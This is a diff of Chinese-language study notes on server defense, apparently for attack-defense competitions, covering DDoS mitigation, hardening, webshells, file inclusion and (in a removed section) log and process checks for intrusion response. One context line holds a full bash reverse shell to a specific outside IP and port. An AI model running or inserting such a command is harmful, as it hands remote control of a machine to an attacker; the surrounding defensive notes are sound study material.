@@ -6,58 +6,13 @@ ddos：流量攻击，cdn，封ip，验证码
       exec 9<> /dev/tcp/207.148.84.102/8008;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;^Mno
 	  将相关依赖去除/别名 /exec/curl/wget/tty/socket,subprocess模块..
 计划任务    家目录     passwd/shadow   --- i权限
+关键命令及文件的MD5校验
 
 文件上传限制/检查
 程序的解析原理：
 url的post暴力尝试，根据报错推测   # 不使用通用的url路径(admin)和数据库的库名(admin)，提高密码复杂度，不允许多次尝试和错误页面处理
 文件包含include/命令注入:将所包含的文件变成url传入参数(例如日志记录了攻击语句/图片)使其执行
 菜刀：用来连接shell的工具（命令执行）    webshell：访问url获取目标主机的目录结构（上传文件）
-
-异常用户
-  /etc/passwd
-  /etc/group
-
-异常登陆/ip
- w（/var/run/utmp）
- who /var/log/wtmp
-    /var/log/message
-    /var/log/secure
- history
- last：记录的登录系统的用户名单及是否在线(/var/log/wtmp) 
- lastb：记录的登入系统失败的用户名单(/var/log/btmp)
- lastlog
- w输出详解：
-	USER：显示登陆用户帐号名。用户重复登陆，该帐号也会重复出现。
-	TTY：用户登陆所用的终端。
-	FROM：显示用户在何处登陆系统。
-	LOGIN@：是LOGIN AT的意思，表示登陆进入系统的时间。
-	IDLE：用户空闲时间，从用户上一次任务结束后，开始记时。
-	JCPU：一终端代号来区分，表示在某段时间内，所有与该终端相关的进程任务所耗费的CPU时间。
-	PCPU：指WHAT域的任务执行后耗费的CPU时间。
-	WHAT：表示当前执行的任务
-pkill -kill -t pts/3
-
-异常进程：top  --  ps -ef
-   将相关依赖去除/别名 /exec/curl/wget/tty模块
-异常连接：netstat -lnpa
- 
-find   被攻击的时候可以看创建了什么文件
-find / -u nobody -name test.txt -size +100k -depth 5 -mtime +4/4 -type s -perm +7000 -exec ls -l {} \;   
-	 -empty           #空文件/目录  
-	 ! -name "*.log"  #排除文件  
-	 -mmin -30        #三十分钟内
-	 -nouser          #查无有效属主的文件，即文件的属主在/etc/passwd中不存
-     -newer   f1 !f2  #查更改时间比f1新但比f2旧的文件
-	 -follow          #如果遇到符号链接文件，就跟踪链接所指的文件
-	 -prune           #忽略某个目录
-    find ./ ! \( −path ′/proc*′ −o −path ′/sys*′ \) -a -name '*.txt' -print  #在除dir0、dir1及子目录以外的目录下查找txt后缀文件
-    find ./   \( −path ′./dir0*′ −o −path ′/etc*′ \) -a -name '*.txt' -print  #在dir0、dir1及子目录下查找txt后缀文件
-	#注意，1.使用()要转义，并且前后要有空格  2.使用-path，一定要在路径后面加* ，这才表示在这个路径之后都不匹配
-
-计划任务：
-
-
-
 
 
 端口探测:掌握端口信息。对服务应用程序的指纹进行分析，主要包括版本号、已知的漏洞信息、常规配置信息、针对此应用流行的攻击方法
